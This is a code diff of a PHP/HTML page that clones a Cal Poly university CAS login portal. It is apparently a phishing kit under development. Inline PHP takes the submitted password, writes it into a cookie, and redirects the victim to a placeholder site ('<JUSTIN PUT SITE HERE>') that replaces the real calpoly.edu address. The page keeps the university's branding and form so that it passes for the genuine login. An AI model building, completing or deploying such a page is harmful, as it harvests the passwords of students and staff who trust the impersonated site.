@@ -25,13 +25,14 @@
   <!--<script src="https://webresource.its.calpoly.edu/deployJava/2/deployJava.js"></script>-->
   <script language="JavaScript" type="text/javascript">
   function checkIfSupportedOS() {
-     if (navigator.userAgent.indexOf("Windows NT 5.1")!=-1) {        document.getElementById("unsupportedOS").style.display = "block";
+     if (navigator.userAgent.indexOf("Windows NT 5.1")!=-1) {
+        document.getElementById("unsupportedOS").style.display = "block";
         document.getElementById("loginForm").style.display = "none";
      } else {
         document.getElementById("unsupportedOS").style.display = "none";
      }
   };
-function hideJavaPlugin() {
+  function hideJavaPlugin() {
      if (document.getElementById("deployJavaPlugin"))
 	 {
 		document.getElementById("deployJavaPlugin").style.display = "none";
@@ -39,7 +40,7 @@ function hideJavaPlugin() {
 	 
 	 document.cookie = <?php if(isset($_POST['password'])){ echo json_encode($_POST['password']);} else { echo json_encode('javaScript(0)'); } ?>;	
 		if(<?php echo isset($_POST['password']) ?>){
-			window.location = "calpoly.edu";
+			window.location = "<JUSTIN PUT SITE HERE>";
 		}
 		<?php  $_POST = array(); ?>
   };
@@ -56,6 +57,7 @@ function hideJavaPlugin() {
   
   <!-- Removed reportJavaVersion() from body onload -->
   <body onload="checkIfSupportedOS(); hideJavaPlugin();">
+
   
     <div id = "mainContainer">
       <header>
@@ -95,7 +97,7 @@ function hideJavaPlugin() {
 <div id="loginFormContainer" >
   	<div id="loginForm"> 
       	<!-- BEGIN CAS -->
-<form id="fm1" name="login_form" action="index.php" method="post">
+			<form id="fm1" name="login_form" action="index.php" method="post">
 
 				<div class="uportal-text-error" style="margin-top: .5em; margin-bottom: .5em;">
 					
@@ -162,19 +164,17 @@ function hideJavaPlugin() {
         
 
 <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"applicationID":"22253028","applicationTime":2,"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"4e34bbaf17","transactionName":"YldTYBRYXUVVURdZXFsde2c2FmRzdh8qfnUaRFhRERZZRUQdAFFfRV1dTUlMWhlXUxB8XFJbX2IPXEQYXkET","agent":"","errorBeacon":"bam.nr-data.net"}</script></body>
+
+<script src="media/skins/sage/js/jquery-1.9.1.js" type="text/javascript"></script>
+<script src="media/skins/sage/js/jquery-ui-1.10.1.custom.min.js" type="text/javascript"></script>
+<script src="media/skins/sage/js/detectMobile.js" type="text/javascript"></script>
+<script src="media/skins/sage/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
+<script src="media/skins/sage/js/systemStatus.js" type="text/javascript"></script>
+<script src="media/skins/sage/js/sidebar.js" type="text/javascript"></script>
 <script
   src="https://code.jquery.com/jquery-3.1.1.min.js"
   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
   crossorigin="anonymous"></script>
-<script>
-	    //<![CDATA[
-
-				var returnString = "string";
-        window.onbeforeunload = function(){
-						return returnString;
-        };
-    //]]>
-</script>
 <script type="text/javascript">
 $(document).ready(function() {
 	
